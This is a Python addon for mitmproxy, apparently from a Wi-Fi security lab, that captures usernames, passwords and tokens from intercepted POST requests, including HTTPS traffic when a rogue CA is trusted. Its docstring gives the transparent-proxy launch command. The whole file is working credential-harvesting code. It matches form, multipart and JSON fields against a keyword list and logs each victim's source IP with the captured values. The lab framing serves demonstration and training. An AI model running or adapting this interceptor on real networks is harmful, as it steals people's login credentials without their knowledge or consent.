#!/usr/bin/env python3
"""
Enterprise WiFi Lab — Credential harvesting demo addon.

Logs form POST fields that appear to be credentials (usernames, passwords,
tokens) to stdout (captured by journald as enterprise.service logs).

PURPOSE: Demonstrates that an attacker controlling the AP — with a trusted CA
         on the client — can silently capture plaintext credentials from any
         HTTPS site. Works on HTTP with no CA required.

REQUIRES: For HTTPS sites — mitmproxy CA must be trusted on the client (Demo B).
          For HTTP sites  — no CA required (traffic is already plaintext).

Usage:
  sudo PROXY_CREDENTIAL_LOG=1 ./enterprise_lab.sh

Or manually alongside the content-modification addon:
  sudo mitmdump --mode transparent --showhost --listen-port 8080 \\
                --listen-host 0.0.0.0 --set tls_version_client_min=TLS1_2 \\
                -s mitm_credential_logger.py -s mitm_demo_modify.py
"""

import urllib.parse
from mitmproxy import http

# ---------------------------------------------------------------------------
# Field name patterns that suggest credential content.
# Matching is case-insensitive and checks if the keyword appears anywhere
# in the field name (e.g. "user_name", "loginEmail", "pwd" all match).
# ---------------------------------------------------------------------------
CREDENTIAL_KEYWORDS = (
    "user", "uname", "name", "email", "login", "mail",
    "pass", "pwd", "secret", "token",
    "credential", "auth",
)


def _looks_like_credential(field_name: str) -> bool:
    name = field_name.lower()
    return any(kw in name for kw in CREDENTIAL_KEYWORDS)


def request(flow: http.HTTPFlow) -> None:
    """Called by mitmproxy for every HTTP request passing through."""
    if flow.request.method != "POST":
        return

    content_type = flow.request.headers.get("content-type", "").lower()

    # Parse application/x-www-form-urlencoded (standard HTML form POST)
    if "application/x-www-form-urlencoded" in content_type:
        try:
            body = flow.request.get_content()
            if not body:
                return
            fields = urllib.parse.parse_qs(body.decode("utf-8", errors="replace"))
            creds = {k: v for k, v in fields.items() if _looks_like_credential(k)}
            if creds:
                print(
                    f"\n{'='*60}\n"
                    f"[CRED] POST to {flow.request.pretty_url}\n"
                    f"[CRED] Source IP : {flow.client_conn.peername[0]}\n"
                    f"[CRED] Fields    : {creds}\n"
                    f"{'='*60}"
                )
        except Exception as exc:
            print(f"[CRED] parse error: {exc}")

    # Parse multipart/form-data (some login forms)
    elif "multipart/form-data" in content_type:
        try:
            for name, value in flow.request.multipart_form.items():
                if _looks_like_credential(name.decode("utf-8", errors="replace")):
                    print(
                        f"\n{'='*60}\n"
                        f"[CRED] POST to {flow.request.pretty_url}\n"
                        f"[CRED] Source IP : {flow.client_conn.peername[0]}\n"
                        f"[CRED] Field     : {name!r} = {value!r}\n"
                        f"{'='*60}"
                    )
        except Exception as exc:
            print(f"[CRED] multipart parse error: {exc}")

    # Log raw body for JSON POSTs (APIs, SPAs) — truncated for readability
    elif "application/json" in content_type:
        try:
            body = flow.request.get_content()
            if not body:
                return
            decoded = body.decode("utf-8", errors="replace")
            # Only log if any credential keyword appears in the raw JSON
            if any(kw in decoded.lower() for kw in CREDENTIAL_KEYWORDS):
                preview = decoded[:500] + ("..." if len(decoded) > 500 else "")
                print(
                    f"\n{'='*60}\n"
                    f"[CRED] JSON POST to {flow.request.pretty_url}\n"
                    f"[CRED] Source IP : {flow.client_conn.peername[0]}\n"
                    f"[CRED] Body      : {preview}\n"
                    f"{'='*60}"
                )
        except Exception as exc:
            print(f"[CRED] JSON parse error: {exc}")
